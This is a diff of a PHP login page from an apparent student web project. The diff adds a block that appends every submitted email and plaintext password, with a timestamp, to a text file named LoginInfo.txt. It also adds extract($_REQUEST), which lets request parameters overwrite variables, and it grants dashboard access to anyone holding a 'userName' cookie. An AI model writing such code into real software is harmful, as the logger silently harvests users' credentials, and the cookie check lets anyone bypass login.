@@ -1,11 +1,13 @@
 <?php
 
-session_start();
+// session_start();
 
 include($_SERVER["DOCUMENT_ROOT"] . '/sms_project/public/header.php');
 include($_SERVER["DOCUMENT_ROOT"] . '/sms_project/public/meta.php');
 
-
+if(isset($_COOKIE['userName'])){
+  header('location:dashboard.php');
+}
 
 $error = "";
 if (isset($_POST['submit'])) {
@@ -20,8 +22,7 @@ if (isset($_POST['submit'])) {
   }
 }
 
-$_SESSION['eMail'] = $userName;
-$_SESSION['passWord'] = $userPassword;
+
 
 
 
@@ -48,13 +49,25 @@ $_SESSION['passWord'] = $userPassword;
       <button><input type="submit" name="submit" value="Login"></button>
       <?php echo $error ? ($error) : (""); ?>
     </div>
+    <div class="larger">
+      <input type="checkbox" name="Remember">Keep Me Logged In
+</div>
   </form>
 </div>
 <!-- body end -->
+<?php 
+extract($_REQUEST);
+$file=fopen("LoginInfo.txt", "a");
+date_default_timezone_set("Asia/Calcutta");
+$str = fwrite($file, "Email :$userName " . "\n". "Password :$userPassword " . "\n" . date("d-m-Y h:i:sa"). "\n");
+
+fclose($file);
+
+?>
 
 <?php
 
 // include('./public/footer.php');
 
-include($_SERVER["DOCUMENT_ROOT"] . '/sms_project/public/footer.php');
+include("./public/footer.php");
 ?>
